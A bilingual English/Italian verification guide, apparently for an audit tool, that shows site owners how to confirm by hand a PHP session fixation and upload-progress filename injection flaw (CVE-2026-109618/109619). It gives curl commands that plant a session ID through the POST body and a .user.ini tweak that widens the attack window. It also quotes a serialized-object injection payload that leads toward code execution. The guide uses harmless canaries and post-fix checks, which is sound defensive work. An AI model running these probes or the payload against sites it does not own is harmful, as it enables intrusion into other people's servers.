# VERIFY.md — Manual audit replication (CVE-2026-109618/109619)

How to check **manually**, on your own website, what the tool does
automatically. Useful to understand the mechanics, and to re-verify
after patching. For websites you own only.

Replace `www.your-site.example` and `/path/to/php_sessions` with your
actual domain and session save_path (the tool/probe reports it).

---

## English version

### 1. Session fixation via POST body (rfc1867 producer, CVE-2026-109619)

Generate an SID and a canary (harmless text), then send a multipart
POST with the PHPSESSID **in the body only** (no cookie):

```bash
SID=$(openssl rand -hex 16)
CANARY="AUDIT-$(openssl rand -hex 8)"
echo test > /tmp/f.txt

curl -s -o /dev/null \
  -F "PHPSESSID=$SID" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
  -F "f=@/tmp/f.txt;filename=$CANARY" \
  https://www.your-site.example/
```

Verify over SSH that the session file was created (fixation worked):

```bash
ls -la /path/to/php_sessions/sess_$SID
```

If it exists: the server accepted an SID from the POST body, even with
`session.use_only_cookies = 1`. With `cleanup=On` (the default) the
file remains but is emptied at the end of the upload: `cat` will show
0 bytes. File creation alone proves the pre-app rfc1867 upload-progress
cycle ran — the 619 producer surface is live.

### 2. Seeing the canary inside the file (filename landing in the session)

The progress data (with the raw filename) exists only DURING the
upload. Two ways to observe it:

#### a) Over SSH, watching during the upload (race)

Terminal 1 (SSH on the server):

```bash
watch -n 0.2 'cat /path/to/php_sessions/sess_$SID 2>/dev/null | grep -o "$CANARY.*" ; ls -la /path/to/php_sessions/sess_$SID 2>/dev/null'
```

Terminal 2: re-run the curl from step 1 (optionally with a large file:
`head -c 5M /dev/zero > /tmp/f.txt`).

If the canary appears: the filename is written **raw** into the session
file. Note: if a WAF buffers the request, the window is milliseconds —
you may need many attempts or parallel uploads.

#### b) Temporarily cleanup=Off (most reliable)

If the hosting allows a per-directory `.user.ini`:

```bash
# in the docroot (via FTP/SSH):
echo "session.upload_progress.cleanup = Off" > .user.ini
```

Then re-run the curl from step 1: after the upload finishes, the data
stays:

```bash
cat /path/to/php_sessions/sess_$SID
# look for your canary inside the "name";s:N:"AUDIT-xxxx..." line
```

**Remember to remove the cleanup line from .user.ini afterwards**
(cleanup=Off is a condition more favourable to the attacker).

### 3. Post-fix verification (repeat after updating PHP)

After the provider applies a patched PHP (or upload_progress=Off):

```bash
SID=$(openssl rand -hex 16)
curl -s -o /dev/null \
  -F "PHPSESSID=$SID" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
  -F "f=@/tmp/f.txt;filename=FIXCHECK" \
  https://www.your-site.example/
ls /path/to/php_sessions/sess_$SID
```

Correct outcome after the fix: **the file does NOT exist** — patched
PHP rejects the SID from the body (honours use_only_cookies) and with
upload_progress=Off the mechanism does not start at all. If the file is
still created, the fix is not active on that vhost.

### Notes

- Nothing dangerous is needed to validate: the canary is plain text.
  If the canary lands in the file, a filename with PHP code would land
  in the same place — the full demo (up to RCE) belongs in the lab,
  do not repeat it in production.
- For the pipe/object payload (`x|O:8:"EvilTest":0:{}`) from a
  terminal: curl mangles quotes into %22 — use the tool
  (`php2shell_audit.py verify`), which uses raw sockets with correct
  escaping.
- Cleanup after testing: `rm /path/to/php_sessions/sess_AUDIT*` and
  remove `probe.php` and any cleanup line in `.user.ini`.

---

## Versione italiana

### 1. Session fixation via POST body (producer rfc1867, CVE-2026-109619)

Genera un SID e un canary (testo innocuo), poi invia un multipart POST
con il PHPSESSID **solo nel body** (nessun cookie):

```bash
SID=$(openssl rand -hex 16)
CANARY="AUDIT-$(openssl rand -hex 8)"
echo test > /tmp/f.txt

curl -s -o /dev/null \
  -F "PHPSESSID=$SID" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
  -F "f=@/tmp/f.txt;filename=$CANARY" \
  https://www.tuo-sito.example/
```

Verifica via SSH che il file sia stato creato (fixation riuscita):

```bash
ls -la /percorso/php_sessions/sess_$SID
```

Se esiste: il server accetta un SID dal body della POST, anche con
`session.use_only_cookies = 1`. Con `cleanup=On` (il default) il file
resta ma viene svuotato a fine upload: `cat` mostrerà 0 byte. La sola
creazione del file dimostra che il ciclo upload-progress rfc1867
pre-app è girato — la superficie producer della 619 è attiva.

### 2. Vedere il canary dentro il file (atterraggio del filename)

Il dato progress (con il filename grezzo) esiste solo DURANTE l'upload.
Due modi per osservarlo:

#### a) Da SSH, osservando durante l'upload (race)

Terminal 1 (SSH sul server):

```bash
watch -n 0.2 'cat /percorso/php_sessions/sess_$SID 2>/dev/null | grep -o "$CANARY.*" ; ls -la /percorso/php_sessions/sess_$SID 2>/dev/null'
```

Terminal 2: rilancia la curl del punto 1 (magari con un file grande:
`head -c 5M /dev/zero > /tmp/f.txt`).

Se vedi il canary comparire: il filename viene scritto **grezzo** nel
file di sessione. Nota: con il WAF che bufferizza la request la
finestra è di millisecondi — potrebbero servire molti tentativi o
upload paralleli.

#### b) Temporaneamente cleanup=Off (modo più affidabile)

Se il hosting consente `.user.ini` per-directory:

```bash
# nella docroot (via FTP/SSH):
echo "session.upload_progress.cleanup = Off" > .user.ini
```

Poi rilancia la curl del punto 1: a upload finito il dato resta:

```bash
cat /percorso/php_sessions/sess_$SID
# cerca il tuo canary dentro la riga  "name";s:N:"AUDIT-xxxx..."
```

**Ricordati di rimuovere la riga cleanup da .user.ini** dopo la
verifica (cleanup=Off è una condizione più favorevole all'attacco).

### 3. Verifica post-fix (da rifare dopo l'aggiornamento di PHP)

Dopo che il provider applica il PHP patchato (o upload_progress=Off):

```bash
SID=$(openssl rand -hex 16)
curl -s -o /dev/null \
  -F "PHPSESSID=$SID" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
  -F "f=@/tmp/f.txt;filename=FIXCHECK" \
  https://www.tuo-sito.example/
ls /percorso/php_sessions/sess_$SID
```

Esito corretto dopo il fix: **il file NON esiste** — il PHP patchato
rifiuta il SID dal body (rispetta use_only_cookies) e con
upload_progress=Off il meccanismo non parte proprio. Se il file viene
ancora creato, il fix non è attivo su quel vhost.

### Note

- Non serve caricare nulla di pericoloso per validare: il canary è
  testo. Se il canary atterra nel file, un filename con codice PHP
  atterrebbe nello stesso punto — la demo completa (fino a RCE) è nel
  lab, non ripeterla in produzione/preprod.
- Per il payload pipe/oggetto (`x|O:8:"EvilTest":0:{}`) da terminale:
  curl storpi le virgolette in %22 — per quello usa il tool
  (`php2shell_audit.py verify`), che usa raw socket con escaping
  corretto.
- Pulizia dopo i test: `rm /percorso/php_sessions/sess_AUDIT*` e
  rimuovi `probe.php` e l'eventuale riga cleanup in `.user.ini`.
